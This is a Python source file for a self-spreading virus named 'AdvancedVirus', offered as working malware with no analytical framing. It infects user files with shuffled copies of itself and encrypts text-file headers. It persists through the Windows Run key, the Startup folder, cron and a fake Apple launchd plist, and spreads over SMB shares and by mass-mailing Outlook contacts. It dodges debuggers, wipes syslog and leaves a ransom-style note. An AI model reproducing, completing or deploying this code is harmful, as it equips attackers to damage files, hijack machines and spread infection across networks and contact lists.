import os
import sys
import glob
import hashlib
import platform
import random
import time
import ctypes
import winreg
import subprocess
import base64
from cryptography.fernet import Fernet
from pathlib import Path
from impacket.smbconnection import SMBConnection

# Configuration
VIRUS_SIGNATURE = "X5K!9d#G"  # Less obvious marker
TARGET_EXTENSIONS = ['.py', '.txt', '.docx', '.xlsx', '.jpg']  # More targets
MAX_INFECTION_SIZE = 5 * 1024 * 1024  # 5MB limit
INFECTION_DELAY = (10, 60)  # Random delay between operations (seconds)


class AdvancedVirus:
    def __init__(self):
        self.obfuscation_seed = random.randint(1, 1000)
        self.own_hash = self._calculate_hash(__file__)
        self.key = self._generate_crypto_key()
        self.cipher = Fernet(self.key)
        self.is_debugged = self._check_debugger()
        self.user_home = Path.home()

    def _check_debugger(self):
        """Anti-debugging techniques"""
        try:
            if sys.gettrace() is not None:
                return True
            if platform.system() == 'Windows':
                return ctypes.windll.kernel32.IsDebuggerPresent()
            return False
        except:
            return False

    def _generate_crypto_key(self):
        """Generate stable key based on system characteristics"""
        system_id = (platform.node() + str(os.cpu_count())).encode()
        digest = hashlib.sha256(system_id).digest()
        return base64.urlsafe_b64encode(digest)  # Fixed key generation

    def _calculate_hash(self, filepath):
        """Quick file hashing with partial reads"""
        hasher = hashlib.sha256()
        with open(filepath, 'rb') as f:
            while chunk := f.read(4096):
                hasher.update(chunk)
        return hasher.hexdigest()

    def _obfuscate_code(self, code):
        """Basic code obfuscation"""
        lines = code.split('\n')
        random.seed(self.obfuscation_seed)
        random.shuffle(lines)
        return '\n'.join([f'# {random.randint(1000, 9999)}\n' + line for line in lines])

    def _infect_file(self, filepath):
        """Advanced file infection with multiple methods"""
        if self._should_skip(filepath):
            return

        try:
            with open(filepath, 'r+', encoding='utf-8', errors='ignore') as f:
                content = f.read()

                if VIRUS_SIGNATURE in content:
                    return

                # Polymorphic infection
                virus_code = self._obfuscate_code(self._get_virus_code())
                infection_method = random.choice([self._prepend, self._append, self._wrap])
                infection_method(f, content, virus_code)

                if filepath.endswith('.txt'):
                    self._encrypt_file(filepath)

        except Exception as e:
            pass

    def _prepend(self, f, content, virus_code):
        """Prepend virus code"""
        f.seek(0)
        f.write(f"# {VIRUS_SIGNATURE}\n{virus_code}\n{content}")

    def _append(self, f, content, virus_code):
        """Append virus code"""
        f.seek(0, 2)
        f.write(f"\n# {VIRUS_SIGNATURE}\n{virus_code}")

    def _wrap(self, f, content, virus_code):
        """Wrap original content in virus code"""
        f.seek(0)
        f.write(f"# {VIRUS_SIGNATURE}\n{virus_code}\n__VARS = '''\n{content}\n'''\n")

    def _should_skip(self, filepath):
        """Check if file should be skipped"""
        filepath_str = str(filepath).lower()  # Convert Path to string
        base_checks = (
                os.path.getsize(filepath) > MAX_INFECTION_SIZE or
                self._calculate_hash(filepath) == self.own_hash or
                'system32' in filepath_str or
                'antivirus' in filepath_str
        )
        return base_checks

    def _get_virus_code(self):
        """Extract current virus code with error correction"""
        with open(__file__, 'r', encoding='utf-8') as f:
            code = f.read()
        start = code.find('# VIRUS_START')
        end = code.find('# VIRUS_END') + len('# VIRUS_END')
        return code[start:end]

    def _encrypt_file(self, filepath):
        """Hybrid encryption with partial overwrites"""
        try:
            with open(filepath, 'rb+') as f:
                data = f.read()
                encrypted = self.cipher.encrypt(data[:1024])  # Only encrypt header
                f.seek(0)
                f.write(encrypted + data[1024:])
        except:
            pass

    def _copy_to(self, target_dir):
        """Copy virus to target directory"""
        try:
            target_path = target_dir / Path(sys.argv[0]).name
            if not target_path.exists():
                with open(__file__, 'rb') as src, open(target_path, 'wb') as dst:
                    dst.write(src.read())
        except:
            pass

    def _establish_persistence(self):
        """Multi-platform persistence mechanisms"""
        try:
            # Windows startup folder
            startup_path = self.user_home / 'AppData' / 'Roaming' / 'Microsoft' / 'Windows' / 'Start Menu' / 'Programs' / 'Startup'
            if startup_path.exists():
                self._copy_to(startup_path)

            # Windows registry
            if platform.system() == 'Windows':
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                     'Software\\Microsoft\\Windows\\CurrentVersion\\Run',
                                     0, winreg.KEY_WRITE)
                winreg.SetValueEx(key, 'WindowsUpdate', 0, winreg.REG_SZ, sys.argv[0])
                winreg.CloseKey(key)

            # Linux cron
            if platform.system() == 'Linux':
                subprocess.run(['crontab', '-l'], stdout=subprocess.DEVNULL, check=False)
                subprocess.run(f'(crontab -l 2>/dev/null; echo "@reboot {sys.executable} {__file__}") | crontab -',
                               shell=True, check=False)

            # MacOS launchd
            if platform.system() == 'Darwin':
                plist_path = self.user_home / 'Library' / 'LaunchAgents' / 'com.apple.update.plist'
                if not plist_path.exists():
                    plist_content = '''<?xml version="1.0" encoding="UTF-8"?>
                    <plist version="1.0">
                    <dict>
                        <key>Label</key>
                        <string>com.apple.update</string>
                        <key>ProgramArguments</key>
                        <array>
                            <string>{}</string>
                            <string>{}</string>
                        </array>
                        <key>RunAtLoad</key>
                        <true/>
                    </dict>
                    </plist>'''.format(sys.executable, __file__)
                    plist_path.write_text(plist_content)
        except:
            pass

    def propagate(self):
        """Intelligent propagation with network awareness"""
        # Local propagation
        target_paths = [
            self.user_home / 'Desktop',
            self.user_home / 'Documents',
            Path('/media'),
            Path('/mnt'),
            Path('//network/share')
        ]

        for path in target_paths:
            if path.exists():
                for entry in path.rglob('*'):
                    if entry.is_file() and entry.suffix.lower() in TARGET_EXTENSIONS:
                        self._infect_file(entry)

        # Network propagation
        if random.random() < 0.3:  # 30% chance
            self._spread_via_smb()
            self._spread_via_email()

    def _spread_via_smb(self):
        """Network share propagation using impacket"""
        try:
            # Example propagation logic
            smb = SMBConnection('*SMBSERVER', '192.168.1.100', sess_port=445)
            smb.login('guest', '')  # Anonymous login

            shares = smb.listShares()
            for share in shares:
                if 'ADMIN$' not in share.shareName:
                    try:
                        smb.connectTree(share.shareName)
                        file_list = smb.listPath(share.shareName, '*')
                        for file in file_list:
                            if file.is_directory():
                                continue
                            if file.get_longname().endswith(tuple(TARGET_EXTENSIONS)):
                                self._infect_remote_file(smb, share.shareName, file.get_longname())
                    except:
                        continue
            smb.close()
        except:
            pass

    def _infect_remote_file(self, smb, share, filename):
        """Helper for infecting remote files"""
        try:
            content = smb.getFile(share, filename).read()
            if VIRUS_SIGNATURE.encode() not in content:
                infected_content = self._obfuscate_code(self._get_virus_code()).encode() + b'\n' + content
                smb.putFile(share, filename, infected_content)
        except:
            pass

    def _spread_via_email(self):
        """Simulate email spreading using Outlook"""
        try:
            if platform.system() == 'Windows' and random.random() < 0.1:
                import win32com.client
                outlook = win32com.client.Dispatch("Outlook.Application")
                for contact in outlook.GetNamespace("MAPI").AddressLists.Item(1).AddressEntries:
                    mail = outlook.CreateItem(0)
                    mail.Subject = "Important Update"
                    mail.Body = "See attached document."
                    mail.Attachments.Add(sys.argv[0])
                    mail.To = contact.Address
                    mail.Send()
        except:
            pass

    def _collect_system_info(self):
        """Gather system reconnaissance data"""
        try:
            info = {
                'os': platform.platform(),
                'user': os.getlogin(),
                'network': subprocess.check_output('ipconfig' if platform.system() == 'Windows' else 'ifconfig',
                                                   shell=True).decode(),
                'processes': subprocess.check_output('tasklist' if platform.system() == 'Windows' else 'ps aux',
                                                     shell=True).decode()
            }
            with open(self.user_home / 'system_info.txt', 'w') as f:
                f.write(str(info))
        except:
            pass

    def payload(self):
        """Stealthy payload with delayed activation"""
        if self.is_debugged or time.time() - os.path.getctime(__file__) < 3600:
            return  # Skip in analysis environments

        self._establish_persistence()
        self._collect_system_info()

        if random.random() < 0.01:  # 1% chance per execution
            self._activate_payload()

    def _activate_payload(self):
        """Controlled payload activation"""
        try:
            warning_path = self.user_home / 'Desktop' / 'READ_ME_NOW.txt'
            if not warning_path.exists():
                warning_path.write_text("Your system has been encrypted!\n")
        except:
            pass

    def _remove_persistence(self):
        """Remove persistence mechanisms"""
        try:
            # Windows registry
            if platform.system() == 'Windows':
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                     'Software\\Microsoft\\Windows\\CurrentVersion\\Run',
                                     0, winreg.KEY_WRITE)
                winreg.DeleteValue(key, 'WindowsUpdate')
                winreg.CloseKey(key)

            # Linux cron
            if platform.system() == 'Linux':
                subprocess.run('crontab -r', shell=True, check=False)

            # MacOS launchd
            if platform.system() == 'Darwin':
                plist_path = self.user_home / 'Library' / 'LaunchAgents' / 'com.apple.update.plist'
                if plist_path.exists():
                    plist_path.unlink()
        except:
            pass

    def self_destruct(self):
        """Advanced cleanup with anti-forensics"""
        try:
            # Overwrite virus file
            with open(__file__, 'wb') as f:
                f.write(os.urandom(os.path.getsize(__file__)))
            os.remove(__file__)

            self._remove_persistence()

            if platform.system() == 'Linux':
                subprocess.run(['shred', '-zu', '/var/log/syslog'], check=False)
        except:
            pass


# VIRUS_START
if __name__ == '__main__':
    virus = AdvancedVirus()
    time.sleep(random.uniform(*INFECTION_DELAY))

    if Path('ANTIDOTE').exists():
        virus.self_destruct()
        sys.exit(0)

    virus.propagate()
    virus.payload()

    if not sys.argv[0].endswith(('.py', '.exe')):
        virus._copy_to(Path(sys.argv[0]).parent / 'system_service')
# VIRUS_END